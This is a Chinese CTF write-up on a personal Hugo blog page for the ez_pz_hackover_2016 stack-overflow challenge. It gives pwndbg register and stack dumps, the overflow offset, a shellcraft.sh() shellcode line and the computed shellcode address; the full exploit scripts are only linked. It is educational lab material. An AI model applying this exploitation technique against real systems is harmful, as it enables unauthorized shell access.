@@ -1,0 +1,616 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.36d0987006a4b9c3341e62a9e55cd9446b790bd2367575177aa5d794949c7cf0.js" integrity="sha256-NtCYcAakucM0HmKp5VzZRGt5C9I2dXUXeqXXlJScfPA=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>wp - 微风的龙</title>
+    <link rel="icon" href="/favicon_hu_912579ba8553ef86.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_220d0e60e04d07f1.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_e404a0b940aa1839.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_603e3ce51eff6377.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_149e475083d0f0f9.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="博客, Hugo, PWN, BUUOJ, 个人主页" />
+  <meta name="description" content="
+
+
+
+我们输入的是s
+chall函数里有这么一段，s要包含crashme就能通过这里的的判断。
+ fgets(s, 1023, stdin);
+  n = strlen(s);
+  v3 = memchr(s, 10, n);
+  if ( v3 )
+    *v3 = 0;
+  printf(&#34;\nWelcome %s!\n&#34;, s);
+寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。
+后续将0x400的字符传入vuln
+
+
+
+
+再将传入的字符复制到dest中。dest的大小是0x32
+这里可以构造栈溢出。
+文件里有printf，可以用这个进行ret2libc
+网上的wp说dest实际上是16个字节，" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="wp">
+  <meta name="twitter:description" content="我们输入的是s chall函数里有这么一段，s要包含crashme就能通过这里的的判断。
+fgets(s, 1023, stdin); n = strlen(s); v3 = memchr(s, 10, n); if ( v3 ) *v3 = 0; printf(&#34;\nWelcome %s!\n&#34;, s); 寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。 后续将0x400的字符传入vuln 再将传入的字符复制到dest中。dest的大小是0x32 这里可以构造栈溢出。 文件里有printf，可以用这个进行ret2libc 网上的wp说dest实际上是16个字节，">
+<meta property="og:url" content="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/wp/">
+  <meta property="og:site_name" content="微风的龙">
+  <meta property="og:title" content="wp">
+  <meta property="og:description" content="我们输入的是s chall函数里有这么一段，s要包含crashme就能通过这里的的判断。
+fgets(s, 1023, stdin); n = strlen(s); v3 = memchr(s, 10, n); if ( v3 ) *v3 = 0; printf(&#34;\nWelcome %s!\n&#34;, s); 寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。 后续将0x400的字符传入vuln 再将传入的字符复制到dest中。dest的大小是0x32 这里可以构造栈溢出。 文件里有printf，可以用这个进行ret2libc 网上的wp说dest实际上是16个字节，">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="buu">
+    <meta property="article:published_time" content="2026-04-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-15T00:00:00+00:00">
+    <meta property="article:tag" content="BUU">
+
+  <meta itemprop="name" content="wp">
+  <meta itemprop="description" content="我们输入的是s chall函数里有这么一段，s要包含crashme就能通过这里的的判断。
+fgets(s, 1023, stdin); n = strlen(s); v3 = memchr(s, 10, n); if ( v3 ) *v3 = 0; printf(&#34;\nWelcome %s!\n&#34;, s); 寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。 后续将0x400的字符传入vuln 再将传入的字符复制到dest中。dest的大小是0x32 这里可以构造栈溢出。 文件里有printf，可以用这个进行ret2libc 网上的wp说dest实际上是16个字节，">
+  <meta itemprop="datePublished" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="wordCount" content="926">
+  <meta itemprop="keywords" content="BUU">
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.db20b90f1e018f02fe452451fb9603d42007e5f5abc40cd58ddadfec0d7764f3.css" integrity="sha256-2yC5Dx4BjwL+RSRR+5YD1CAH5fWrxAzVjdrf7A13ZPM=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="https://weifengdel0ng.github.io/css/home.css" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+</head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-xxl">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://weifengdel0ng.github.io/">微风的龙
+</a>
+
+    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">微风的龙</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
+        <hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/">首页
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/posts/">文章
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/about/">关于
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-xxl-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="搜索"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-xxl-none">配色</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="蓝色"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="蓝灰色"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="棕色"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="青色"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="绿色"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="靛青色"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="橙色"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="粉色"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="紫色"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="红色"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="蓝绿色"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="黄色"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-xxl-none">模式</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> 浅色
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> 深色
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> 自动
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.f7179afb1166ccce2102740afe4caf205dbc623896eb19a268f6cb9367e6eea6.js" integrity="sha256-9xea&#43;xFmzM4hAnQK/kyvIF28YjiW6xmiaPbLk2fm7qY=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">你的浏览器不支持 JavaScript。</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="版权">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="评论">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="切换侧边栏">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">wp</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="创建于 2026-04-15 08:00:00 &#43;0800 CST。">April 15, 2026</span><span class="post-reading-time me-1 mb-1">2 分钟阅读</span><a href="/categories/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>BUU</a><a href="/tags/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">BUU</a>
+</div>
+<div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body"><p><picture><img class="img-fluid " alt="Pasted image 20260304083956.png" src="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/wp/%E9%99%84%E4%BB%B6/Pasted%20image%2020260304083956.png" loading="lazy" width="432" height="122" />
+</picture>
+
+
+我们输入的是s
+chall函数里有这么一段，s要包含crashme就能通过这里的的判断。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">1023</span>, stdin);
+</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(s);
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">memchr</span>(s, <span style="color:#ae81ff">10</span>, n);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v3 )
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Welcome %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span></code></pre></div><p>寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。
+后续将0x400的字符传入vuln
+<picture><img class="img-fluid " alt="Pasted image 20260304085031.png" src="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/wp/%E9%99%84%E4%BB%B6/Pasted%20image%2020260304085031.png" loading="lazy" width="590" height="165" />
+</picture>
+
+
+再将传入的字符复制到dest中。dest的大小是0x32
+这里可以构造栈溢出。
+文件里有printf，可以用这个进行ret2libc
+网上的wp说dest实际上是16个字节，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; i r
+</span></span><span style="display:flex;"><span>eax            0xffffc5e6          -14874
+</span></span><span style="display:flex;"><span>ecx            0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>edx            0xffffc9e6          -13850
+</span></span><span style="display:flex;"><span>ebx            0xf7f9fe14          -134611436
+</span></span><span style="display:flex;"><span>esp            0xffffc5e0          0xffffc5e0
+</span></span><span style="display:flex;"><span>ebp            0xffffc618          0xffffc618
+</span></span><span style="display:flex;"><span>esi            0x8048720           <span style="color:#ae81ff">134514464</span>
+</span></span><span style="display:flex;"><span>edi            0xf7ffcb60          -134231200
+</span></span><span style="display:flex;"><span>eip            0x8048600           0x8048600 &lt;vuln+28&gt;
+</span></span><span style="display:flex;"><span>eflags         0x282               <span style="color:#f92672">[</span> SF IF <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cs             0x23                <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span>ss             0x2b                <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>ds             0x2b                <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>es             0x2b                <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>fs             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>gs             0x63                <span style="color:#ae81ff">99</span>
+</span></span><span style="display:flex;"><span>k0             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k1             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k2             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k3             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k4             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k5             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k6             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>k7             0x0                 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; search crashme
+</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> byte: b<span style="color:#e6db74">&#39;crashme&#39;</span>
+</span></span><span style="display:flex;"><span>ez_pz_hackover_2016 0x8048853 arpl word ptr <span style="color:#f92672">[</span>edx + 0x61<span style="color:#f92672">]</span>, si /* <span style="color:#e6db74">&#39;crashme&#39;</span> */
+</span></span><span style="display:flex;"><span>ez_pz_hackover_2016 0x8049853 <span style="color:#e6db74">&#39;crashme&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>          0x804b1a0 <span style="color:#e6db74">&#39;crashme\n&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>         0xffffc565 0x73617263 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cras&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>         0xffffc602 <span style="color:#e6db74">&#39;crashme&#39;</span>
+</span></span></code></pre></div><p>这里可以看到我们输入的crashme在0xffffc602
+ebp在0xffffc618，确实是0x16 。
+第一次的脚本exp1
+最后的shellcode用：shellcode=asm(shellcraft.sh())
+s的开头：<picture><img class="img-fluid " alt="Pasted image 20260304175610.png" src="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/wp/%E9%99%84%E4%BB%B6/Pasted%20image%2020260304175610.png" loading="lazy" width="1211" height="233" />
+</picture>
+
+
+我们去找/bin/sh</p>
+<p>对于shellcode的生成请参考ai大佬生成的文章Shellcode 生成规则与 Pwndbg 动态调试
+在这里我们调试后可以看到栈上的内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>00:0000│ esp   0xfffd7820 ◂— <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>01:0004│ eax-2 0xfffd7824 ◂— 0x787c788c
+</span></span><span style="display:flex;"><span>02:0008│-030   0xfffd7828 ◂— 0x400fffd
+</span></span><span style="display:flex;"><span>03:000c│-02c   0xfffd782c ◂— 0x70000
+</span></span><span style="display:flex;"><span>04:0010│-028   0xfffd7830 ◂— 0xe79e0000
+</span></span><span style="display:flex;"><span>05:0014│-024   0xfffd7834 ◂— 0xf7ef
+</span></span><span style="display:flex;"><span>06:0018│-020   0xfffd7838 ◂— 0x78dc0000
+</span></span><span style="display:flex;"><span>07:001c│-01c   0xfffd783c ◂— 0x8b8cfffd
+</span></span><span style="display:flex;"><span>08:0020│-018   0xfffd7840 ◂— 0x7263f7f2
+</span></span><span style="display:flex;"><span>09:0024│-014   0xfffd7844 ◂— <span style="color:#e6db74">&#39;ashme&#39;</span>
+</span></span><span style="display:flex;"><span>0a:0028│-010   0xfffd7848 ◂— 0x61610065 /* <span style="color:#e6db74">&#39;e&#39;</span> */
+</span></span><span style="display:flex;"><span>0b:002c│-00c   0xfffd784c ◂— <span style="color:#e6db74">&#39;aaaaaaaaaaaaaaaa&#39;</span>
+</span></span><span style="display:flex;"><span>... ↓          <span style="color:#ae81ff">2</span> skipped
+</span></span><span style="display:flex;"><span>0e:0038│ ebp   0xfffd7858 ◂— <span style="color:#e6db74">&#39;aaaa&#39;</span>
+</span></span><span style="display:flex;"><span>0f:003c│+004   0xfffd785c ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>10:0040│+008   0xfffd7860 ◂— 0x2f68686a <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;jhh/&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>11:0044│+00c   0xfffd7864 ◂— 0x68732f2f <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;//sh&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>12:0048│+010   0xfffd7868 ◂— 0x6e69622f <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>13:004c│+014   0xfffd786c ◂— 0x168e389
+</span></span><span style="display:flex;"><span>14:0050│+018   0xfffd7870 ◂— 0x81010101
+</span></span></code></pre></div><p>0xfffd7860是shellcode的起始地址
+<picture><img class="img-fluid " alt="Pasted image 20260304183525.png" src="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/wp/%E9%99%84%E4%BB%B6/Pasted%20image%2020260304183525.png" loading="lazy" width="453" height="65" />
+</picture>
+
+是s的起始地址。两者相差0x1c，也就是shellcode的位置在 ==s_addr - 0x1c==
+将其写到脚本中得到最终的expexp2</p>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-1/2-1-2/ez_pz_hachover_2016/exp1/">exp1</a>
+    </div></div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">版权</h2>
+    </div>
+    <div class="card-body">
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">评论</h2>
+  </div>
+  <div class="card-body">
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="accordion profile">
+  <div class="accordion-item card row text-center component">
+    <div class="accordion-header card-header border-0" id="profile-header">
+      <a
+        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
+        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
+        Profile
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
+      <div class="col-12 d-flex align-items-center justify-content-center"><img
+  class="profile-avatar rounded-circle"
+  alt="微风的龙"
+  src="/images/profile.png"
+  loading="lazy"
+  data-viewer-invisible
+></div>
+      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">微风的龙</div>
+<div class="profile-bio">哈基龙的博客，随便看看</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>China</div><a class="profile-about" target="_blank" rel="noopener noreferrer" href="https://github.com/weifengdel0ng"><i class="fas fa-fw fa-user"></i>关于我</a></div>
+
+
+<nav class="social-links nav justify-content-center mt-1 justify-content-around">
+      <a class="nav-link social-link" target="_blank" href="https://github.com/weifengdel0ng" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%B8%80%E9%A1%B5/harekazectf2019baby_rop2/%E9%99%84%E4%BB%B6/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  </div>
+</div>
+
+
+<div class="accordion taxonomies-toggle">
+    <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+            <a
+                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
+                Taxonomies
+            </a>
+        </div>
+        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
+            <ul class="nav nav-pills nav-fill" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
+                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
+                            分类
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
+                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
+                            标签
+                        </button>
+                    </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
+                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
+                        归档
+                    </button>
+                </li>
+            </ul>
+            
+            <div class="tab-content mt-3">
+                    <div class="tab-pane active" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
+                        <a href="/categories/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/categories/%E4%B8%93%E9%A2%98/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="专题">
+                            专题
+                        </a>
+                        <a href="/categories/%E5%BB%BA%E7%AB%99/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="建站">
+                            建站
+                        </a>
+                    </div>
+                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
+                        <a href="/tags/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/tags/blog/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Blog">
+                            Blog
+                        </a>
+                        <a href="/tags/github-pages/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        <a href="/tags/hugo/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hugo">
+                            Hugo
+                        </a>
+                    </div>
+                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">
+
+    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2026">
+    2026 <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
+    </a>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            文章
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  最近文章
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/hello-hugo/">
+        博客已上线
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/buu/">
+        BUU
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
